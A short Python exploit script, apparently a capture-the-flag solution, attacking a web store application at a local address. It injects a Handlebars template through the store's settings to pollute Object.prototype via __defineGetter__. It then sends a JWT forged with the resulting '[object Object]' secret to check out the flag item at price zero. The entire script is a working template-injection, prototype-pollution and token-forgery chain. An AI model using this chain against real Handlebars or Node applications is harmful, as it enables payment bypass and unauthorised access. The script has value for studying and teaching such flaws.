import requests

url = 'http://192.168.65.128:3000'


s = requests.session()

r = s.post(url + '/store',data={'name':'asdf'})
store = r.url.strip('/')

# We cause prototype polution of Object.prototype using __defineGetter__
# This will make ({}).key = '[object Object]' for any object without a `key` prop
r = s.post(store + '/manage/settings', data={'header':'''{{#with this.__proto__}}
{{this.__defineGetter__ "key" this.toString}}
{{/with}}'''})


# Since we have not created any items for the store, the `key` prop won't be set
# so store.key will return '[object Object']. We can abuse this by signing a jwt
# for the flag with this key

# require('jsonwebtoken').sign({id:'flag.flag', price:0}, '[object Object]');
jwt_payload = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZsYWcuZmxhZyIsInByaWNlIjowLCJpYXQiOjE1Njc1MjYzMzd9.6zshon9YKCqdD_Z9uY2_rexU4QJq9dIAwDTnUfSRRqQ'

r = s.post(store + '/checkout', data={'token':jwt_payload})
print r.text


